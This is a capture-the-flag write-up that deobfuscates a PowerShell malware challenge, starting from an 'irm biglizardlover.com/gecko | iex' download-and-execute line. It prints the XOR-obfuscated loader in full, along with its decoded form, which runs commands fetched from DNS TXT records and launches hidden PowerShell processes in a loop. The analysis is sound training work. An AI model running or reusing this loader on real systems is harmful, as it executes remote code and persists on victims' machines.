## Chall description
```
Category: Malware
Erm, what the sigma?
We saw this strange PowerShell string on one of our hosts, can you investigate and figure out what this does?
irm biglizardlover.com/gecko | iex
```

## Procedure
This chall has not any file, just a reference to `irm biglizardlover.com/gecko | iex`, this code try to download and execute something, checking the website `biglizardlover.com/gecko` with `curl`, show us a `403 Forbidden`
```bash
curl "http://biglizardlover.com/gecko" -I
HTTP/1.1 403 Forbidden
Date: Sat, 25 Oct 2025 03:31:13 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Referrer-Policy: same-origin
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
X-Frame-Options: SAMEORIGIN
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=loRjQjmAU7Th4uMNFvGwkzKQEuRvF%2BOTOKsa2hgN8hXt55VnYm%2F6iAJdYba8CntE9hn4M5iTqwps4NoutRoiBfVK00EF92Z7Bf8edZtPgIA6zD%2FwqjLzGGp86F38"}]}
Server: cloudflare
CF-RAY: 993ea3c64d81d7c1-EZE
```

**What is `irm`?**\
`irm` is shorthand for `Invoke-RestMethod` used to send HTTP requests, this mean the website maybe check the `User-agent`, waiting for `Powershell` User-agent, let's modify our curl to specify the Powershell User-agent.
```bash
curl "https://biglizardlover.com/gecko" -H 'User-agent: PowerShell/7.4.0'
.( ([sTriNg]$vERBOsEpREfEREnCe)[1,3]+'X'-JoiN'') ( ( '12G10G4}12I8b73G98G122&22&111f99f65f95G92,73f79,119,24&0y30z26f0,30&25,113y1z70G99I101I98b11z11&5,12f4&98G73z91}1z99f78z70y73}111y120y12r12}69f67I2I79&99&97,92G94G105z95}127,101z67r66b2,104}105r74I64f109z120y73f127b88I94y73}109G97y4I12}119&69,67}2z65f105r65y67r126y85y127G120,94I105r77I65y113f119b111b99,66z122f105r94,88r113y22r22,106r94b67&65z78I109&95&105f26y24}127z88f126&101&66G107G4y11b72&122&122,78}120b7b98y107&106I100I27,66z122&24&85z69z64f121r24&95z84z88r66,117z105}106}103&111r73&97b69&107z78r101z64y103&101f105G29}75f93f118I92G107b91}88G75b66,118I92}94I84&30f110f30z124&125y27,103y89y3r31,88z29,84&89z117I65G28G126y72}94z96r89&74&30r66r74G65r7I24f91f121f77,72b30z101b91,65G73}71f28G125b30}31b30G94,98,29r89&88&20r92f73z122y116z92b122b73b122,85I122I31I77}67G20}93}71&93&3G77y70r106f31f86}121r109&85y24&103f111b109}75z91r125}99r95I28I111r68G31}124z120f100I105}30r122z125I93z20f111}101r122r109}116I109r91z73&75r121I99&106,86}7&98,94z67,78y78z124r94I70f121f125I93I99z91I21G86G25b99f102z124y104&79y97I84}75b28}84}20G104&116y24}77&116b75&122G26f72f7I75z25z86y94r24z97G105z123,78&88f106&30f78r92f122r69z31&103&79}109I66&3&72z30b26f125G21r24G102}110}27r66&67}31G86}101f25r111r106,88&74}72y88G77b122y25,70r67r69b124b75I28&109y105y99I122,7r102y66r109&97f24,118I123I31b85z103f93&66}117y26y93I68b92G24b74,117I90&91I84,97G77f109r105G116G109z75&125y106y98y78,124}100y111z24r107I28G91r21b100}86z70I121f20r101G104&104f103f106y122z107y92z25,96I98&85I98}103r69G92f127,25G24G124f68y116&107}116r101G28f86r107,117G86y107r27,73z116&67}79b93f68&116,3I74r25G68b90z120f75z7,78z126b77b21I94f95I124,94G29f74I3y75I124}89z93&72I105&64}109y74,31,95I124&95z121f89b20z102f102,64I64z79f109z125}79G72I105y121}85I96G20f65}109,117b126r73&27y88r124y71b97z107b126f127f25I121&86&110}78,27r31z107&110G85r21}66,27G120G65,126z74f103,69b109b125y27f106}71&123f77r96f122,110I90,126r117r70z25z123y122G117f20b127y68}107,85r121}109I118G25z86&89f78y64r20r71r96y103G127&118I103G64G30&94I126f78b126y117I27r26b85f99,21,105G121,94f78&24r109b95f29z122f71I102I89I84r29r93f71f7r98b27,92G109b118&21}122&24G25G69,117b91f101,65f127}24b67b7I26f91f69r120y101z86f67y21,71,111&122}120G120r106f124}109y21r69b90I110y121y102G92f67f122f92z98&86}72f124y21I85&94I69&125f68y71z30r86y123,124f73b66}104,31I124b109r68I28z71f124I104f73I77r111&92G78,29}70y65r86b123f84}116r79r118}84y96y64&72}106&28}28z75&66r68f78&65y102z117b31b97z67I89z79,25z25y67b121f28,86&64r71r106z27&101G91G88G25}26r90,110z24}102r124}71}127&26y106y97G118G90f127&93z89f29b89I90&29f30z90r73b31z116&64G104b90&93y85f104,94,109}77,104,124I29I107,66G100y27}68b65y77G120r29I126&110z68G86,89y20y29f26y31f30y7r122z96f70r73G90f122}77r25z70z77}84z116r100f117&90}7,85f65b97y99b25&29y101,73r116I110}100}107r99G126I107r21y120,89&101z66,86}111z93I102,109&117y31}125b78r25,68z94,66&28y74r116,64y71b31f25I96z89&70b72y96}90G31G68z28f85b117I64G99b24z103b79G104}68f101z124I74&74f75b97I97f21I109,75,74r79&105G109b20r89}97I109G7f29I85y101f68r95&25}100I126r77r64G72,25&102,122G116z93f29r98}104,28,127y75,106y7r122y90,29&127b64,126}21r89r77I29}31r120y117G73b20b66y116z102G31G93z3&93I90G72b102y92}99z93y72f74z64z64&110z66b31z98r107r79&95I30G110r125}24r105&77G100}85z65b31,7z101,72z71I78,104&109}31b102z124y79G29f30G120G25b127G127r79I104&68b78y91r86,102&89I71b68&125z94,28r66f95G68z85r85I28f97r72,71z68z91G117r69f31G75}127}85G67}27G65y106f117,64I31z85I98&86&84}3y27y28f64f85z24f24b84&30r107z68z116I64&120y125,106b97&70f124&111,106,64f85,21z102}66}29f106I127}127G27,99}109r99y78I121,109y72y106I91f71G93y121z7I89b117z71y102r7I20}111y94b66}116f24I103G21b78,24r124f123r88&118b105f27&94f90b90&69f30I110}28r31r104r93G104,123G98y30,94z89I122&66&123b125,126z117y121,20r111G106r72f107}99I103y92I90}126&109r127b95r92I88&77,111&123}109y101I72z117G69f92&7z110I70}93r127y21,67f120&26I121G116G69,122r28,109I68r91f95b111G89,111,91r126z72f28I102f28,7r126f94&70z99,107,107z94}97r70I86G73f123,100z30b71}70b93b123f71}79&104G79b73r86r67G96G21,7b86}78I66&89r25,84f122G31I67G122&68}78b95,121y121&117b127z103z89r77,97z28r95r73z124z88z7}31y102y105}71z21,100}86z70r30y64b123z110&100I92z29}72}105f86y100b88I29z94z105&97f73y92f124G7,90,64b85y24I91,27G98}122&126}94b74I103y101I73b25f97r85b29}121I103,96G102z109I74G65f96&7r72r89y74y73r25b77}75G66f105,123b88G21y125z78}121G72G31G111G31G107G20G24I89b78&26I116z110b85}3b72f74&94z3b66r67,24}100}78f73G117I73y25I116&107&93f78&102z120}92&66&24&94r3f86&97b123I97G91b68b111r101r27z77&105,122,84G99z126&127b121y98r105z107z102r94,20I68f78G94f111}96y79I67y31r79I7y92f3b78&88b25G98y73,74I101I116f20y126&98b25f116,24y96,86G121z122y25f111r102,24}29b66&86}7y117z7,95,95G21r24I116&105G72&102&105,84&89r64b3,68f107}24}77z31I75I121b95&73y123I30&121y25&98,122z72y20}102}31G21I29I117&111&116&30}98b110z110z109y90G109y7b118r69&7&74y89f107,88y74r120f84y78y75f97r104y72z91b118z72f85z72,103,124}85&68z27f95G92&86I88r79I124r91&24y74I106y91}7&116I71G126f64y116&95z90I102z107}28}21&28b96z111r94r69,31,89,89r110r66r70&88,20y104&110&85I90f75,124y71&90z77b90y29I101}70b118&27f7&74}66I72,102I103r126b122I103r118,70f27r7f125}89b97z120G79&3b91G104I66&24}104z91z17z17I11G5,12r0z119z95z85r127b120&73&97G2r101}67f2}79b99}65b124}94G105&127G127,69G67&66f2z79y67y97r124z94}73G95I127z69&67z98z65,67,104z105b113,22z22I72b105b111,99G65}92b94y73z95}127r12&5b12,80z106z67y94&105f109f111}68b1G99I110z102f73r111f120z12&87&12&98G73G91z1,99f78,70I73}111y120y12G12f101f67&2I95b120&94r73y77r65z94,105b77&72r105r126&4r12z8I115z0b119,120}105z84,88G2}105z66f79,67,72f101r66}75,113r22f22z109z95}79r69z69}5y12f81b80b106b67&94z105}77,111I100y1b99,78I102f73z111z88f12&87&12G8r115,2y126f105b109b104G120,67&73I98}72,4G5}81I12,5}12'-SPlIT 'g' -spLiT'R'-sPLiT '&'-SplIt ','-sPlIt 'Y'-SplIT 'z'-SPLIT '}' -sPlIT 'i'-SpliT 'F' -SPLit'b'|% { [CHar]( $_ -bxoR  0x2c  ) } )-jOIN'')%
```

Now we have the real and obfuscated Powershell code, we can use [Powerdecode](https://github.com/Malandrone/PowerDecode) for this step. **Note: PowerDecode will emulate the code on your machine, I always recommend run this one on VM, take a snapshot, execute the PowerDecode, when you finish your analysis, restore your snapshot.**
```powershell
Layer 7 - Obfuscation type: Unknown

 while ($true) {
    $glideelbow = iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName VFdWbllVSnZibXM9.biglizardlover.com -Type txt | Select-Object -ExpandProperty Strings))))
    $twilightdepend = Join-Path $env:TEMP "lizard.jpg"
    $biscuitrecognize = Get-Random -Minimum 1 -Maximum 25
    $galaxyfeastparty = "https://biglizardlover.com/img/lizard$biscuitrecognize.jpg"
    Invoke-WebRequest $galaxyfeastparty -OutFile $twilightdepend -ErrorAction SilentlyContinue | Out-Null
    Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class W { [DllImport(`"user32.dll`")] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }"; [W]::SystemParametersInfo(20,0,$twilightdepend,1+2) | Out-Null
    Start-Process powershell -ArgumentList '-Command', $glideelbow -WindowStyle Hidden
}
$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9"
```
```powershell
Variables at layer 3

Name:
COnsUMeRfASHIOn
-------
Value:
WXpBME16UmtOVGt3TWpnPQ==
--------------------------------------------------
```
```powershell
Variables at layer 7

Name:
biscuitrecognize
-------
Value:
9
--------------------------------------------------
Name:
cMJzG0
-------
Value:
))93]rahC[,421]rahC[,63]rahC[F-)')}'+'2'+'{X}2{+]31[DiLlEhS}'+'0'+'{+]1[DiLLehS}0'+'{ '+'( & }1{)(Dn'+'e'+'oTDaeR.))iICsa::]gnIDO'+'cne'+'.T'+'XE'+'T.'+'meTS'+'Ys[ '+',))sSE'+'RPmoCED::]Edo'+'MNoiSs'+'ERP'+'MOC'+'.noisserp'+'M'+'Oc.OI'+'[,) }2{A43z'+'8KG1R90j76'+'WrqRe0zaKr1L'+'m7LKR5X1s'+'aiooB'+'DH'+'D7+J0i5tJ77Lo'+'6ANRbL+OWh'+'TP+H'+'i34F'+'Mg4'+'d'+'0Un'+'dNziXX78'+'6fT'+'D'+'iXrh44V'+'98'+'/b2/Cx'+'T1'+'iNhkmH'+'dEZ0Ln'+'Oc2c'+'a'+'P'+'1KMpKx68RJMAHU'+'4AFwwVE'+'imSSE6hS59'+'pc'+'d'+'lT3ESTEl2aHvZV'+'0JapPtRwySxNSQ'+'ZcEC'+'ae'+'A97cD'+'9UK'+'Y'+'IgN'+'aLh'+'bke7GmqIIa'+'KKT4'+'1VcN7z8t'+'mMNv'+'2cF'+'VLWia/S/1kBZJG7xQt6KK'+'5'+'ERPU9WkrNQBEo78GoZQz+ZT'+'m3'+'/7zAjM0H6BqK29+'+'ZJNV290k1NbZTu1'+'eYZK+'+'XTt'+'UUKbaJ'+'gWPt'+'0kB'+'waCGky'+'+vXM'+'EAJ8aP9Yf}2{('+'gni'+'RTs4'+'6ESa'+'BmoRF::]TrevNOC[ ]MAE'+'RTSyR'+'OMEm.Oi.Me'+'Ts'+'ys'+'[ (mAERtS'+'eTAlfED.'+'N'+'oissER'+'pM'+'oc.oI.M'+'ETsys TcEjbo'+'-W'+'en'+' ((Re'+'dAERmAe'+'RTS.Oi.MEtsYS Tc'+'Ejbo'+'-Wen ( '(( ( )''nioJ-'X'+]3,1[)EcnereferpeSOBReV$]gNirts[( (.
--------------------------------------------------
Name:
galaxyfeastparty
-------
Value:
https://biglizardlover.com/img/lizard9.jpg
--------------------------------------------------
Name:
glideelbow
-------
Value:
Add-Type -AssemblyName System.Speech; Add-Type -AssemblyName System.Windows.Forms
$SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$SpeechSynth.SelectVoice('Microsoft Zira Desktop')
$lizard = Get-Date -Format tt
while ($true) {
    $SpeechSynth.Speak($lizard)
    [System.Windows.Forms.MessageBox]::Show($lizard, 'Alert', 'OK', 'Information')
}
$UniqueRebel = "TWpVeU9UWXlORGN3ZlE9PQ=="
--------------------------------------------------
Name:
objectTest
-------
Value:
Wm14aFozczNOak0wTWpZNVlXVmhPRGs9
--------------------------------------------------
Name:
twilightdepend
-------
Value:
C:\Users\demo\AppData\Local\Temp\lizard.jpg
--------------------------------------------------
```
Checking every de-obfuscate layer, we can see `Wm14aFozczNOak0wTWpZNVlXVmhPRGs9` `WXpBME16UmtOVGt3TWpnPQ==` and `TWpVeU9UWXlORGN3ZlE9PQ==`

<img width="1347" height="562" alt="Screenshot 2025-10-25 at 12 47 28 AM" src="https://github.com/user-attachments/assets/d9c65633-4cd6-466b-adb2-6aad58ac9f4b" />

Flag `flag{7634269aea89c0434d59028252962470}`



